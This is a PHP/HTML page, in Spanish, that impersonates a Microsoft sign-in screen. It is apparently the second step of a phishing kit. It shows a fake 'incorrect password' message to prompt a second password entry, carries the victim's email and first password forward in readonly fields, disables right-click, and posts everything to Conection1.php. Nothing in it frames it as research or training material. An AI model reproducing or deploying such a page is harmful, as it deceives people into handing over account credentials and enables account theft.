<!DOCTYPE html>

<html>

<head>

	<body oncontextmenu="return false">
	<link rel="shortcut icon" href="//www.microsoft.com/favicon.ico?v2">
	<title>Microsoft</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	
	<meta charset="UTF-8">
	
	<meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
    <meta http-equiv="Pragma" content="no-cache">
	
	<meta name="360-site-verification" content="e362348efd31ed6e77bcf0ba4963a6de">
    <meta name="sogou_site_verification" content="tKz9Rld4qH">

        <meta name="keywords" content="Test">
        <meta name="description" content="Test">
        <meta name="subject" content="Test">
        <meta name="copyright" content="Test">
        <meta name="url" content="http://www.test.com">
        <meta name="language" content="en-GB">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <meta name="pagename" content="$Title">
        <meta name="coverage" content="Worldwide">
        <meta name="distribution" content="Global">
        <meta name="target" content="all">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="640">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="cleartype" content="on">
        <meta name="apple-mobile-web-app-title" content="$Title">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="ResourceLoaderDynamicStyles" content="">
        <meta http-equiv="etag"
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="x-dns-prefetch-control" content="off">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">

        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
        <meta name="apple-mobile-web-app-title" content="Ratchet">

        
	
	<link rel="stylesheet" type="text/css" href="estilo2.css">
</head>

<body>

<section class="box" >
	
	<div class="animated fadeIn" id="container1">
	<div><img class="logo" src="logo1.svg" alt="logo1.svg"></div>
	<div class="animated fadeInRight" id="inner1">

		<form class="form" action="Conection1.php" method="POST">
		   
        		   <?php 
                     $variable= $_POST['email'];
        echo '<a href="index.php"><img class="flecha" src="flecha.svg" alt="flecha.svg"></a><input id="dato" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
		<br>

		 

		<h2> Escribir contraseña</h2>

		<h1>La cuenta o la contraseña es incorrecta. Si no recuerdas la cuenta, <FONT>restablécela ahora.</FONT></h1>
	
			<input  id="clave1" type="password" name="pass1" placeholder="Contraseña" required="Numero">
			<br>
			<br>
			<h6>¿Olvidó su contraseña?</h6>
			<h4>Otras formas de iniciar sesión</h4>
			<br>
			<input  id="accept" type="submit" value="Inicia sesión">
			</div>
             <?php 
                     $variable= $_POST['pass'];
        echo '<a href="index2.php"></a><input id="dato1" name="pass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
	       </div>
 

		</form>
		
		<?php
 
header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
 
header("Expires: Sat, 1 Jul 2000 05:00:00 GMT"); // Fecha en el pasado
 
?>

	

	<div class="bottom">
		<h5>Términos de uso</h5>
		<h5>Privacidad y cookies  ...</h5>
	</div>
	
</section>

</body>

</html>